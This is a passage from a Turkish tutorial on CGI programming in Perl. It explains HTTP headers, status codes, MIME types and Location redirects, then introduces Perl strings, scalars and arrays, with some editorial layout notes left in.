Siz Browser’ın URL adres hanesine “http://bilmenne.com/filanca.htm” yazıp Enter’a bastığınızda, Internet’te “Bilmemne.com” olarak bilinen bilgisayar, sizin bilgisayarınıza “filanca.htm” dosyasını göndermeye kalkmadan önce, “HTTP Headers” denen bir takım “ön bilgiler” gönderir; ve böyölece bir bakıma Browser’ı alacağı belgeyi “nasıl anlaması ve yorumlaması” gerektiği konusunda uyarmış olur. HTML dili ikinci sürümüne ulaştığında, uzmanlar, bu başlıkları da standardize ederek, HTML belgesinin başlık (<HEAD>..</HEAD>) bölümüne koymayı düşündüler. Böylece Server’ın Browser’a göndereceği ön bilgiler de Web tasarımcısının kontrolüne girdi.

Biz yukarıdaki örneklerde bir META etiketini (“http-equiv=.. content=.. charset=..”) kullandık. Bundan başka meta etiketleri de vardır. Örneğin, “Keywords” META etiketi, HTML belgesiyle ilgili arama yapıldığın bu kelimelere bakılmasını sağlar. CGI programcısı olarak dinamik bir içerik sunabilmek içn ziyaretçiye uygun HTML sayfasını Perl programımıza, bu kelimelerle arattırabiliriz.

Bazı Web Server programları META etiketleri tam olarak okumazlar; veya aynı META etiketinden iki kere yazarsak, birincisini unutabilirler. Fakat bu bizi yıldırmamalı; sayfalarımıza uygun META etiketleri daima koymalıyız.

////////////////////////////////KUTU BITTI////////////////

**İstemcinin İstekleri - Sunucunun Sundukları**

CGI programlarının Browser’la ilişkisini ele aldık. Fakat CGI programı, “Browser için” yazıldığı kadar “Server için” de yazılır. CGI ile Server’ın çalışmasını da programlamış oluruz. Bu yüzden, Server’ın CGI-HTML ilişkisindeki yerini da tanımak zorundayız. Server’ı tanımaya Browser ile istem-sunuş ilişkisindeki yerinden başlayabiliriz. Browser ile Server nasıl alış veriş yapıyorlar; ne alıp, ne veriyorlar!

Ziyaretçi olarak siz Browser’ın URL adres kutusuna, sözgelimi server.com adlı halayî sunucudaki merhaba.htm belgesinin adını (adresini) yazdığınızda neler olur? Bunu kısaca, adım adım görelim:

1. Browser’ın http://www.server.com/merhaba.htm adlı belgeyi talep etmesi, Server’a bir “HTTP Request” (HTTP Talep) komutu göndermesi demektir. “GET” şeklindeki bu komut sadece “Bana şu kaynağı gönder!” şeklinde olmaz. Browser komutun arkasına Browser’ın ne tür belgeler (text, HTML, Access, Excel, vs uygulama programı dosyaları) ve media (GIF, JPEG, Bitmap, vs.) kabul edebileceğini, ve Browser’ın türü ve sürümünü, ve dosya ilgili (varsa) önşartlarını da ekler.

Diyelim ki bir Browser, bir Server’dan index.htm adlı dosyayı istiyor ve bu dosyayı ancak ve sadece 12 Ocak 2000, GMT saat 10:00’dan sonra değişmişse göndermesini şart koşuyor. Bu durumda “HTTP Request” şöyle olur:

** GET /index.htm HTTP/1.1 **

** If-Modified-Since: Sun, 12 Jan 2000 10:00:00 GMT**

** Accept: text-html**

** Accept: \*/\***

** User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)**

Burada, Browser, varsayılan talep komutu olan GET ile ne istediğini ve ne kabul edebileceğini Server’a bildiriyor.

2. Server bu talebi alınca önce belgeyi arar; bulamazsa Browser’a hata mesajı gönderir. Server, bu dosyayı bulursa, önce uzantısına bakarak, ne tür bir dosya olduğuna karar verir; ve

3. Bu karara dayanarak, gerekli başlık (header) bilgilerini ve dosyanın içeriğini talep sahibi Browser’a gönderir. (Bu arada başlıkla içerik arasına bir boş satır koyması da ihmal etmez! Bu boş satır, Server’ın Browser’a gönderdiği iki önemli veri kümesini birbirinden ayırmaya yarar.)

Bu bilgi aşağı yukarı şuna benzer:

**HTTP 1.1 200 OK**

**Date: Mon, 12 Jan 2000 02:30:49 GMT**

**Server: Internet Information Server 4.02.06.31**

**Content-type: text/html**

**Content-length: 235**

**Last-modified: Mon, 12 Jan 2000 02:25:00 GMT**

**<HTML>**

**<HEAD>**

**<TITLE>MERHABA DÜNYA</TITLE>**

**<meta http-equiv=\\"content-type\\" content=\\"text/html; charset=ISO-8859-9\\">**

**<meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=windows-1254\\">**

**</HEAD>**

**<BODY>**

**<H4>Merhaba Dünya</H4>**

**</BODY>**

**</HTML>**

///////////////////TASARIM İÇİN NOT//////////////

Yukarıdaki kodda <HTML> diye başlayan satırın üzerinde bir satır boşluk olması gerekir! 

/////////////////NOT BITTI///////////////////////////////

Bu bilgileri yakından incelersek, başlık bölümü ile gövdeyi birbirinden bir boşluğun ayırdığını görürüz. Bu boşluğun görevi başlık bölümü ile gövdeyi ayırmak değil, başlık bölümünün bittiğini Browser’a belirtmek içindir. Bu boşluğun üstündeki başlık bölümünde birinci satırda durum başlığı (status header) denilen Server Protokolünün istenen belgeyi bulup, bulamadığını belirten bilgi yer alır. Buradaki örnekte yer alan “200” kodu, belgenin bulunduğunu gösterir.

////////////////KUTU//////////////////

**HTTP Statü Kodları:**

**Kod Mesaj Anlamı**

200 OK Aranan belge bulundu ve gönderildi

204 No Content Belge bulundu, fakat gönderilecek bir içerik yok (Browser’da mevcut görüntü değişmez)

301 Moved Permamently Aranan belge temelli başka bir adrese aktarıldı (Yeni adres Location Header-Yer Başlığı bölümüne yazılır)

302 Moved temporarily Aranan belge geçici olarak başka bir adrese aktarıldı (Yeni adres Location Header-Yer Başlığı bölümüne yazılır)

400 Cannot be found Erişmek istediğiniz dosya bulunamıyor

401 Unauthorized Erişmek istediğiniz belge korunmuştur (Browser, kullanıcı adı ve parola soran bir pencere açabilir)

403 Forbidden Erişmek istediğiniz belgeye erişim yasaklanmıştır

403.10 Access Forbidden Erişmek için sunduğunuz yetki kaydı yeterli değil

403.11 Access Forbidden Erişmek için sunduğunuz parola değişmiş

404 Site not found Aradığınız site (URL) bulunamıyor.

405 Resource not allowed Dosya, yanlış adres verdiğiniz için bulunamıyor

406 Not acceptable Browser’ınız istediğiniz kaynağı görünteleme yeteneğinde olmadığı için istediğiniz dosya gönderilmiyor

410 Does not exist Aradığınız dosya temelli bulunamıyor

412 Precondition Failed Dosya istemcinin ileri sürdüğü önşartlara uymadığı için gönderilmiyor.

414 URI Too Long Dosya için yazılan yol çok uzun

500 Internal server error Dahilî Server Hatası oluştu

501 Not implemented İstediğiniz yazılım/media türü bu Server’da uygulanamıyor

502 Bad Gateway Server geçit olarak görev yaparken, kendisinden sonraki bir Server’dan hatalı yanıt aldı

//////////////////KUTU BİTTİ///////////////////////////

Durum Başlıklarını, CGI yoluyla talep ettiğimiz bir sayfa veya başka bir dosyanın bulunamaması halinde, ziyaretçinin ekranına hata mesajı gönderilmesini önleyecek tarzda kullanabiliriz. Ayrıca ilerde göreceğimiz gibi, CGI programımız, Server’a doğrudan bir sayfanın yerini HTTP Request komutu olarak bildirebilir. Şimdilik sadece bunu “location” (yer) başlığını kullanarak yapacağızı belirtelim.

Peki, bu isteme-sunma ilişkisinde CGI programımız nerede yer alıyor? Yukarıda Server’ın Browser’ın talebini aldığında bir karar verdiğini belirttiğimiz 2’nci maddeyi hatırlıyor musunuz? İşte o karar sırasında Server, talep edilen kaynağın bir CGI programı olduğunu görürse, derhal bu program için bir “Çevre” (Environment) hazırlar, ve CGI programını çalıştıracak yardımcı programı (örneğin Perl) çağırır. CGI programı (yani perl.exe), kendisine verilen “çevre” değişkenlerini kullanarak, yine kendisine ulaştırılan Perl Script’ini (betiğini) çalıştırır ve elde ettiği sonucu Server’a verir. Server bu sonucu irdeler ve elde ettiği çıktıyı (Output’u, sonucu) Browser’a gönderir. Bu sonuç Perl programının beklediği sonuç olabilir; örneğin Form bilgisi başarıyla işlenebilir. Veya sonuç arzu edildiği gibi olmaz; bir hata durumu oluşur. Bu kez Browser’a hata mesajı iletilir.

Buraya kadar anlattıklarımızı bir de görsel olarak belirtelim.

<cgi-perl010.tif>

Burada genel bir CGI uygulamasının akış şemasını görüyoruz; fakat öyle programlarımız olabilir ki, CGI programının sonucu doğruca istemci Browser’a gönderilir. Kimi zaman, CGI programının sonucu Server’ın başka bir kaynağa yöneltilmesi (Redirect) komutu olabilir. CGI programı, söz gelimi bir siteye girişini koruyan parola programı ise, Server’ı, istemciden yeni bilgi edinmeye zorlayabilir.

**Çıktı Türleri ve Yer**

Bu şemanın son aşaması olan çıktının istemci Browser’a gönderilmesi, CGI programcısı olarak bizim açımızdan çok önem taşır; çünkü şu ana kadar geri planda yaptığımız her şey, bu noktada Internet ziyaretçimizin huzuruna çıkacaktır. Yukarıda yazdığımız küçük Perl örneklerine tekrar bakarsanız, hepsinde şuna benzeyen bir komut satırı göreceksiniz:

print "Content-Type: text/html\\r\\n\\r\\n";

Bu satır, Web Server’ın, CGI programının sonucunu istemciye gönderebilmek için kendi üreteceği başlık (Header) bölümüne koyması gereken asgarî bilgiyi vermektedir. Server, istemciye, istediği dosyayı, belgeyi, kaynağı veya çalıştırılmasını istediği programın sonuçlarını bildirirken, belirttiğimiz başlık bölümünü yazmak zorundadır; yoksa gönderilenleri Browser’ın anlaması ve yorumlaması mümkün olmaz; en azından bu unsurlar Browser tarafından bizim istediğimiz tarzda görüntülenmeyebilir. Server’ın istemciye göndereceği unsur bir HTML sayfası ise, tasarımcı olarak HTML kodumuzun içine hiç META etiketi koymamış olsak bile sorun olmaz: Server, başlık bölümünü kendi üretebilir. Fakat iş CGI programına geldiği zaman, Server kendisini programın yerine koyup, başlığın tümünü üretemez; programdan da en azından kendi bölümüne ilişkin başlık bilgilerini vermesini ister. Bizim örnek Perl programlarımızda yer verdiğimiz “Content-Type” bilgisi, Server tarafından programımızın çıktı’sını (Output’unu) Browser’a tanıtmasına yarar.

CGI programlarımızın Server’a bir çok başlık bilgisi (üst-bilgi) vermesi gerekir; ama bunların asgarîsi, içerik türü (Content-Type) veya gönderilecek malzemenin yeri (Location) bilgisidir. İçerik türü bilgisi, Browser’a kendisine gönderilmekte olan veriyi nasıl yorumlayacağını bildirir. Browser’ların genellikle Server’ların anlayabildiği içerik türlerinin tümünü anlayabilirler. Bununla birlikte bugün piyasada birçok Server programı vardır; bunların hepsi her türlü metin veya çoklu-ortam (Multimedia) dosyasını tanımazlar. Farklı Server ve Browser programları arasında anlayış birliği sağlamak için geliştirilmiş olan standarta, MIME (Multimedia Internet Mail Extensions) adı verilir. MIME gerçekte HTTP Server’ları ve Web Browser’ları için değil POP ve SMTP Server’ları ile elektronik mesaj editörleri arasında içinde ses, grafik ve görüntü (video) bulunan elektronik mesaj alışverişine birlik getirmek üzere geliştirilmişti. Fakat Web’in hızlı gelişimi sırasında HTTP Server ile Web Browser arasında bir belge yorumlama standardı geliştirme ihtiyacı doğunca, kullanılmaya hazır MIME’dan yararlanıldı. Bu standarta göre, “Content=Type:” bilgisi “tür/alt-tür” şeklinde yazılır. Örneğin, CGI programımızın çıktısı Browser’a HTML dosyası olarak gönderiliyorsa, buna ilişkin bilgi “text/html” şeklinde yazılır. Çünkü MIME’a göre HTML dosyası bir düz metin dosyasıdır.

/////////////////////KUTU//////////////////////////////

**Belli başlı MIME tür/alt-tür grupları**

text/plain Düz metin. Server istenen belgenin uzantısından türünü anlamazsa veya siz CGI programınızda çıktı’nızın içerik türünü belirtmezseniz, Server düz metni varsayılan içerik türü sayar.

text/html HTML dosyası

text/richtext Rich Text biçimi. Bir çok kelime-işlemcisinin ortak dosya biçimidir; bir çok Browser tarafından anlaşılabilir.

image/gif GIF grafik dosyası. Ortak bir biçim olmakla birlikte, içendiği sıkıştırma teknolojisinin kullanımı için bir firmaya telif hakkı bedeli ödeme zorunluğu getirildiğinden bu yana yerini diğer biçimlere bırakıyor. Browser’lar tarafından IMG etiketiyle birlikte kullanıldığında HTML belgesinin parçası olarak görüntülenir.

image/jpeg JPEG grafik dosyası. GIF’ten daha çok renk derinliği içerebilir. Bütün Browserlar tarafından tanınır ve IMG etiketiyle birlikte kullanılabilir.

image/png PGN grafik dosyası. Internet için geliştirilmekte olan grafik biçimi. Henüz bütün Browserlar tarafından tanınmıyor. Bu biçimi tanıyan Browserlar, IMG etiketiyle kullanılan PNG dosyasını HTML belgesi içinde görüntüleyebilirler.

image/x-xbitmap Bitmap grafik dosyası. (Genellikle dosya adının uzatması .xbm olur.) Görüntü, piksel olarak tanımlandığı için fazla ayrıntılı görüntüler için elverişli değildir. Bütün Browserlar tarafından tanınmaz.

audio/basic 8-bit ulaw sıkıştırma tekniği ile üretilen ses kayıt dosyası. (Genellikle dosya adının uzatması .au olur.) Bütün Browserlar tarafından tanınmaz.

audio/x-wav Microsoft firmasının geliştirdiği Windows sistemi için ses kayıt dosyası. (Bütün Browserlar tarafından tanınmaz)

video/mpeg MPEG video kayıt dosyası. Bütün Browserlar tarafından tanınır.

video/quicktime Apple firmasının geliştirdiği MacOS ve Windows sistemleri için video dosyası. Browseın tanıması için ek program çalıştırılması (plug-in) gerekebilir.

video/x-msvideo Microsoft firmasının geliştirdiği Windows sistemi için video kayıt dosyası. (Genellikle dosya adının uzatması .avi olur.)

application/octet-stream Server tarafından tanınmayan bütün dosya türleri için bu içaret türü gönderilir ve bunu gören Browser kullanıcıyü bu dosyayı çalıştırmak veya görüntülemek yerine sabit diske kaydetme imkanı tanır.

application/postscript Postscript yazıcı dili ile gönderilen herhangi bir içerik.

application/vnd.ms-excel MS Site Server, Internet Information Server veya kişisel Web Server programlarının tanıdığı MS Office yazılım paketindeki Excel programının dosyası. Microsoft işletim sistemlerinde çalışan hemen hemen bütün Web Server programları tarafından da tanınmaktadır. (Bu türün alt türleri arasında “application/vnd.ms-powerpoint” ve “application/msword” de bulunur. MS firmasının Internet Browser programı IE tarafından bu içarek türü tanınır ve ilgili MS yazılı çalıştırılarak dosyanın içeriği görüntülenir; diğer browserlar bu içerik türünü sabit diske kaydetmeyi önerirler.

///////////////KUTU BİTTİ//////////////////////

Bir içerik türü satırında parametre de kullanılabilir. CGI programlarının bu tür özellik belirten parametrelere ihtiyacı çoğu zaman olmaz; ama örneğin gönderdiğiniz HTML sayfasının dili burada belirtilebilir.

CGI programlarımızda belirtebileceğimiz asgarî başlık bilgisi (üst-bilgi) “Location” (yer) de olabilir. CGI programımız kimi zaman ortaya bir belge çıkartmaz; diyelim ki mevcut bir başka kaynağa göndermede bulunabilir. Internet’teki belge veya diğer görüntülenebilir, çalıştırabilir, seslendirebilir, oynatılabilir herhangi bir unsura “URI” denir. “Uniform Resource Identifier” (Tekdüze Kaynak Kimliklendirici) kelimelerinin başharfi olan URI, isim veya adres+isim olabilir.

////////////////KUTU//////////////////

**URI türleri**

Beli başlı URI’lerin arasında “URL” (Uniform Resource Locator/Tekdüze Kaynak Yer-belirleyici) vardır. Bir diğer “URI” türü ise “URN” (Uniform Resource Name/Tekdüze Kaynak Adı) sayılabilir. Bir başka “URI” türü olarak, “URC” (Uniform Resource Citation/Tekdüze Kaynak Göndermesi) türü vardır. Başka bir deyişle Internet’te herhangi bir kaynağın kimliği (URI’sini) belirmek için yerini (URL), adını (URN) veya ona yapılan bir göndermeyi (URC) belirtebilirsiniz.

“http:”, “ftp:”, “gopher:” diye başlayan Internet kaynak adresi, URL’dir.

URN’lerin adresleri “urn:” şeklinde başlar.

URC türü adreslendirme standardında ise henüz World Wide Web Konsorsiyomu (w3c.org) içinde görüşmeler tamamlanmamış bulunuyor.

//////////////////////////////////////////KUTU BİTTİ////////////////////

Diyelim ki, bir CGI programında, Browser’a program sonucu olarak kendimiz “print..” komutlarıyla bir HTML belgesi oluşturmayacağız, fakat mevcut bir HTML belgesini göndereceğiz. Örneğin istiyoruz ki programımız istemciye “merhaba.htm” dosyasının yerini (Location) bildirmekle yetinsin. Bunu, şöyle bir Perl programıyla yapabiliriz:

**#!/usr/local/bin/perl**

**# dosya-gonder.pl**

**print “Location: /merhaba.htm\\n\\n”;**

///////////////////TASARIM İÇİN NOT//////////////

Yukarıdaki kodda print diye başlayan satırın üstünde ve altında bir satır boşluk olması gerekir! 

/////////////////NOT BITTI///////////////////////////////

Burada Location başlık bilgisini oluşturacak satırın altında da boşluk bıraktığımıza dikkat edin: bu Server’a başkaca bir başlık (Header) bilgisi vermeyeceğimizi gösöterir. Bu tek satırlık komutu alan Server, Browser’a (sanki Browser bu sayfayı istemiş gibi) bu kaynaktaki sayfayı gönderir. Kimi zaman kaynak, burada olduğu gibi Server’ın kendi sabit diskinde bir dizide bulunmayabilir ve tam bir URL olabilir. Örneğin:

**#!/usr/local/bin/perl**

**# dosya-gonder.pl**

**print “Location: http://www.webteknikleri.com/\\n\\n”;**

///////////////////TASARIM İÇİN NOT//////////////

Yukarıdaki kodda print diye başlayan satırın üstünde ve altında bir satır boşluk olması gerekir! 

/////////////////NOT BITTI///////////////////////////////

Bu durumda bizim Server, istemci Browser’a “302” yani “Dosya başka yere nakledildi!” sonucu ve kendi ürettiği HTML sayfası içinde “Aradığınız dosya için <A HREF= http://www.webteknikleri.com/> burayı</A> tıklayınız!” gibi bir mesaj gönderir. (Bu HTML sayfasının şablonu Server’da bulunur ve Server operatörü tarafından belirlenir. Server’larda bütün HTTP Statü Kodları için kullanılmaya hazır şablon HTML sayfaları bulunur.)

**Diğer Başlıklar**

Yukarıda bir HTTP Server’nın Browser’a gönderdiği tipik bir başlık örneği olarak verdiğimiz metinde, tarih ve saat dikkatinizi çekmiş olmalı. Biçimi Server’ına göre değişmekle birlikte hemen bütün Web Server’lar, başlık (Header) bilgisinin içine tarih ve saat bilgisi de koyarlar. Browser bu bilgiye bakarak, almakta olduğu belgenin (varsa) kendi yedek deposunda (cache, veya Windows sistemlerinde Geçici Internet Dosyaları dizini) sakladığı sürümünü mü görüntüleyeceğine, yoksa yeni gelen sürümünü mü görüntüleyeceğine karar verir. Örnek:

**#!/usr/local/bin/perl**

**# tarih-saat.pl**

**print "Content-Type: text/html\\r\\n\\r\\n";**

**print $time = (localtime), “\\n”;**

///////////////////TASARIM İÇİN NOT//////////////

Yukarıdaki kodda print diye başlayan satırın üstünde ve altında bir satır boşluk olması gerekir! 

/////////////////NOT BITTI///////////////////////////////

Browser’a göndereceğimiz başlık bilgileri içine Expires başlığını koyarak, sayfanın “cache edilmesini” (depolanmasını) önleyebiliriz. Bu durumda Browser, gelmekte olan belgenin kendi yedek deposunda bir örneğini aramaz.

**Sonuç**

Bu bölümde, Internet’te sunucu ile istemcinin, Web Server ile Internet Browser programının buluştuğu yeri, CGI’ı tanıdık; Internet ilişkisinin iki ucundaki bu varlıkların etkileşmesinin esaslarını gördük; ve bu ilişkiyi CGI programı yoluyla nasıl etkilediğimizden söz ettik. Küçük de olsa Perl programı yazdık ve Perl’ün nasıl işlediği hakkında fikir edindik. Fakat henüz bu dil hakkında temel kavramları bilmiyoruz.

Şimdi sıra, CGI’da yolumuzu şaşırmayacak kadar Perl öğrenmekte!

## **Perl’ün Yapı Taşları**

Sadece bir Web Server’da çalışacak da olsa CGI programımızı yazmakta kullandığımız Perl dili, güçlü bir dildir. Perl ile çok şey yapılabilir. CGI programı yazmak, Perl ile yapabileceğimiz işlerden belki de en basitidir. Perl’ü dil olarak öğreten bir çok kaynak bulabilirsiniz. Biz burada Perl’ü sadece CGI programcısının bilmesi gerektiği düzeyde tanımaya çalışacağız.

Perl ile program yazmak için ne büyük derleyiciler, ne de “Visual Perl Programlama Araçları” yok! Perl programı yazarken kullanacağımız tek araç, Windows ortamında Not Defteri, Macintosh’ta Simple Text, Linux’ta ise CoolEdit olabilir. Perl programı yazmak için kelime-işlem programı kullanırsanız, metinlerinizi düz yazı veya ASCII biçiminde kaydetmelisiniz.

Her program, bir öbek veriyi alır ve işler; ortaya bir sonuç çıkartır; veya çıkartmaz. Ortaya somut bir sonuç çıkmaması da programın sonucu olabilir. Perl de işleyebilmek için önce veriye ihtiyaç duyor. Biz insanlar veriyi gördüğümüz anda türünü de anlarız. Bazı bilgisayar programlama dilleri, bizim gibi, verinin türünü, verinin kendisini görünce anlar. Perl’e verinin türünü belirtmek gerekir. Perl’ün verilerle yapabileceği işlemler (operator) klasik aritmetik işlemlerdir. Fakat Perl daha bir çok işlem yapabilir. Bunlar ya Perl’ü geliştirenler tarafından belirlenmiştir (bunlara fonksiyon, işlev denir; ya da fonksiyonlarımızı biz yazarız veya başkalarından (kitaplık/library denen dosyalar halinde) ödünç alırız (bunlara da subrutin denir). Ve bütün bunların sonunda Perl programı ortaya bir sonuç çıkartır ve bu sonucu kendisini göreve çağırana, yani Web Server’a verir.

Bilgisayar programlama uzmanları, Perl’ü bir “okuma ve yazma dili” sayarlar. Perl ile bir veya daha fazla dosya (bilgi, kaynak) okunur; bir sonuç çıkartılır; ve bu sonuç bir başka dosyaya (bilgi deposuna, kaynağa) yazılır. Şimdi Perl’ün bu okuma-yazma işini nasıl yaptığına yakından bakalım:

**Perl’de Veri**

Veri, Perl’ün üzerinde işlem yaptığı şeylerin tümüdür. Veriler, rakam, harf veya işaretlerden ibarettir. Ancak her rakam sayı değildir; bizim Perl’e belirtmemiz gereken ilk şey, ona verdiğimiz verinin sayı mı, yoksa rakam bile olsa sayı-dışı, alfanümerik bir değer (hem harf, hem rakam veya sadece harf veya sadece rakam ve diğer işaretleri içeren karakter dizisi) mi olduğunu söylememiz gerekir. Buna dikkat edin. Çünkü Perl’de daha sonra göreceğimiz herşey verileri bu şekilde ikiye bölmekten kaynaklanır. Şimdi 45’in sayı olması için toplanabilir, çıkartılabilir olması gerekir. 34 yaş olarak, kilo olarak, kilometre olarak bir anlam taşıyorsa, sayıdır. Buna karşılık 34, Istanbul’un il sıra numarası ise sayı-dışı bir rakamdır; buna Perl’ün dilinde String denir. Bir sınıftaki 20 öğrencinin “yaş” rakamları toplanır, 20’ye bölünürse ortaya çıkan rakam, halâ sayıdır: adına “sınıfın yaş ortalaması” denir ve bu rakam (doğru adıyla sayı) başka istatistik hesaplarda kullanırsanız size istatistikçi denir. Buna karşılık 20 ilin il sıra numaraları toplanır, 20’ye bölünürse ortaya anlamsız bir şey çıkar; ve bunu görenler size şaşkın gözlerle bakarlar. Sayılarla aritmetik işlemler yapılır. String (karakter dizeleri) ile, rakam bile olsa, aritmetik işlem yapılmaz. Perl için, 0’dan 255 ASCII değerine kadar herşey String’dir. Bir harf, Perl için String’dir; bir kelime veya bir cümle de String sayılır. Perl için String’lerin sınırı yoktur. Buna karşılık sayılar, sınırlıdır.

Perl’e bir rakamın sayı olduğunu belirmek için öylece yazarsınız; karakter-dizelerini yani String’leri ise tırnak içinde yazarız. Nasıl tırnak? Bir dakika.. Oraya geliyoruz.

Şimdi, bir bilgisayarda 0’dan 255 ASCII değerine kadar sıralanan karakterlerin arasında neler olduğunu hatırlayın. Sözgelimi ASCII 7 değeri nedir? Bilgisayarın bip sesi çıkartması. Peki 13 değeri nedir? Satır başı. O halde, bunlar da String’e, karakter-dizesine dahil midir? Evet. Peki bu değerler de karakter mi sayılır? Ona da Evet.

Bu yüzden Perl’de String’leri yazarken veya kullanırken tek tırnak içine almakla, çift tırnak içine almanın farkı vardır. Tek tırnak içine aldığınız String’in içinde sadece ekranda görüntülenebilen karakterler yer alır. Eğer String’iniz görüntülenemeyen karakter değerlerini içeriyorsa, bu dizeyi mutlaka çift tırnak içine almanız gerekir. String’i çift tırnak içine alırsanız, içine sekme, satır başı veya heksadesimal (16 tabanlı) kodlar koyabilirsiniz. Tek tırnak-çift tırnak farkının bir diğer sonucu ise çift tırnak kullanadığınız taktirde, String’in içine değişken de koyabilirsiniz. Buna, Perl ile metin işlemeyi ele aldığımız zaman döneceğiz.

**Sabit Değerler, Değişkenler**

Peki, demek ki Perl için üzerinde işlem yapılabilecek iki tür veri olabilirmiş: sayılar ve sayı-dışı karakter dizeleri (Stringler).

////////////////SAYFA TASARIMI NOTU////////////////

Yukarıdaki son kelime olan Stringler kelimesine dipnot işareti konarak, bu sayfaya şu dipnotun konulması rica:

“String” ve diğer İngilizce kelimeleri kullanmamak için çok özen gösterdiğimi belirtmeliyim. Üniversitelerimizin incelediğim ders notlarında ve diğer Türkçe kaynaklarda da bu özen gösterilinceye ve meselâ bir kere belirttikten sonra bir daha İngilizce terim yerine ortak Türkçe bir terim kullanılıncaya, yani birlik sağlanıncaya kadar, bireysel çabalar, ancak burada olduğu gibi gereksiz tekrarlardan başka bir şeye yaramayacaktır.

////////////////////////SAYFA TASARIMI NOTU BİTTİ///////////////////

Perl, için veriler ister sayı, ister karakter-dizesi olsun, program boyunca aldıkları durum itibariyle de ikiye ayrılır: Programın başından sonuna kadar değişmeyen sabit veriler ve belirli durumlarda değişenler. Birinci gruba belirli bir sayı veya karakter-dizesi girer. Sözgelimi, bu kod satırındaki veri sabittir:

print “3 kere 3 = 9”;

Bir veri program boyunca çeşitli sebeplerle değişecekse, bu verinin yernini tutmak üzere bir değişken veri tanımlarız. Değişken tanımlamak demek, Perl’e “Kardeşim-veya nasıl hitap etmek istiyorsanız, öyle-şimdi bana bir kap hazırla, bu kaba ‘çarpan’ adını ver; sonra bir kap daha hazırla ona da ‘çarpılan’ adını ver; bir kap daha hazırla ona da ‘sonuç’ adını ver. Ben bu ilk iki kabın içine bir takım değerler koyup, çıkartacağım. Sana ‘Çarpan’ın değerini çarpılan’ın değeri ile çarp, bakalım!’ dediğim anda bu iki kapta o anda ne değer varsa, onları birbiri ile çarp; elde ettiğin sonucu da götür ‘sonuç’ kabının içine yaz!” demektir. Bu komutu böyle Türkçe değil de Perl’ce verdiğiniz anda, nurtopu gibi üç değişkeniniz olur; bunların içine ister siz, ister program, isterse komşunun oğlu istediği değeri koyabilir.

Ve öyle bir an gelir ki, Perl programınızda şöyle bir komut belirir:

$sonuc = $carpan x $carpılan;

print $sonuc;

Bir adım ileri gittik; şu dolar işaretlerini bir paragraf boyunca görmezden gelin! Anlaşıldığı üzere Perl’de değişken tanımlamak demek, sadece bir “yer açmak” demektir. Bunu tiyatrodaki koltuk numaralarına benzetebilirsiniz: C25 numara bir koltuğa işaret eder; ama o koltukta bugün siz, yarın başkası oturabilir. Tiyatroda bulunduğunuz sürece siz C25 numaralı koltuğu dolduran değersiniz. Eser bittiğinde kalkıp gideceğiniz ve yerinizi başkası alacağı için, koltuğun değeri değişken demektir. Tıpkı kötü eser sahneleyen bir tiyatronun C25 numaralı koltuğunun boş kalmış olabileceği gibi Perl’ün değişkenlerinin de içi boş olabilir veya sonradan boşalabilir.

Perl, başka diller gibi değişken adları konusunda aşırı titiz davranmaz. İstediğiniz rakam veya harfi fakat sadece alt çizgi (\_) işaretini değişken adında kullanabilirsiniz. Unix kökenli bir dil olarak gedikli Perl’cüler sadece küçük harf kullanırlar ve büyük kullananlara da iyi gözle bakmazlar! Fakat Perl büyük harfle yazacağınız değişken adlarına hiç itiraz etmez. Fakat Perl büyük harfle küçük harfi ayırır. Yani Perl açısından “Osman” ile “osman” iki ayrı isimdir. Ayrıca Perl için değişken adları rakamla başlayamaz.

Değişken adının tanımmayıcı olmasına dikkat etmek gerekir: “kapi\_no” adı, daima “degisken014” adından iyidir. Her ikisi de Perl açısından makbul değişken adlarıdır, ama ikincisi sadece sizi şaşırtmaya ve programınıza gereksiz hatalar karışmasına sebep olur.

**Tekil Değişkenler, Listeler, Ekleme, Çıkartma******

Peki, yukarıda erken davranıp yazdığımız $ (Dolar) işareti ne anlama geliyor? Bu, Perl’e bu bu değişkenin türünü anlatıyor. Veriler, işlendikleri sırada bilgisayarın belleğinde bir yere yazılır. Perl, her veriye belirli bir boyutta bellek alanı ayırmak zorundadır. Dolayısıyla bir değişken tanımlarken, Perl’e bu veriye ne kadar yer ayıracağını belirtebilmek amacıyla, değişkenin adının önüne koyduğumuz işaretle değişkenin içinde ne tür bilgi olacağını da söylemek zorundayız.

Perl için gerçekte bir tür değişken vardır: Scalar. Veya Türkçe başka kaynaklarda görebileceğiniz yazış şekliyle Skalar. Scale, matematikte, bir cetvel (scale) üzerinde bir nokta demektir; scalar kelimesi, Unix programlama dillerine matematikten geçmiş bir terimdir: burada bu kelimeyi “tek başına duran, bir nokta, bir adet, tekil” gibi anlamak, Perl’ün veri iskeletini kavramayı kolaylaştırır. Perl’de bütün değişken türleri, “tekil bir veri parçacığı” denen Scalar değişkenden türetilir.

“Vildan” adlı teyzenizi düşünün. Tanıdığınız sadece bir teyzeniz var ve onun adı da Vildan. Yani “Teyze = Vildan”. Peki, bunu Perl terimleriyle yazalım:

$teyze = “Vildan”

Benim de bir kardeşim var diyelim: “Kardeş = Mustafa”. Bunu Perl terimleriyle ifade edelim:

$kardes = “Mustafa”

Yani yek başına duran, bir yığın veri arasında tek başına ele aldığımız tekil (Scalar) değişkenleri Perl’e adlarının önüne $ işareti koyarak bildiriyoruz. Bu değişkenin içine sadece karakter-dizesi (String) değil, sayı da koyabiliriz. Perl, başka diller gibi verilerinin türü konusunda zorluk çıkartmaz programcıya.

Devam edelim: Sizin Vildan Teyze’nizle, benim kardeşim Mustafa ve asker arkadaşı Kudret hep birlikte, Osman’ın arkadaşları ise, bu Osman açısından nasıl bir durum arzeder: “Arkadaşlar = Vildan, Mustafa, Kudret”

Peki bunu Perl’e nasıl söyleyebiliriz? Şimdi artık Osman’ın arkadaşları tek başına değerler değil, bir liste. Bu kelimeye dikkat edin: Liste. Böylece Scalar değişkenden listeye geçiyoruz. Liste, veya programcılık diliyle Array (Dizilmiş değişkenler, Dizi), birden fazla değer içerir. Veya içerebilir; içi boş dizi de olabilir Perl’de. Bunu, İngilizce adıyla “at” \[et okunur\] işareti (@) ile yazarız:

@arkadas = (‘Vildan’, ‘Mustafa’, ‘Kudret’)

Perl, bu ifadeyi görünce, içinde üç üyesi bulunan bir dizi oluşturur; adını “arkadaş2 koyduğu bu dizinin içine üç değer yazar: Vildan, Mustafa ve Kudret.

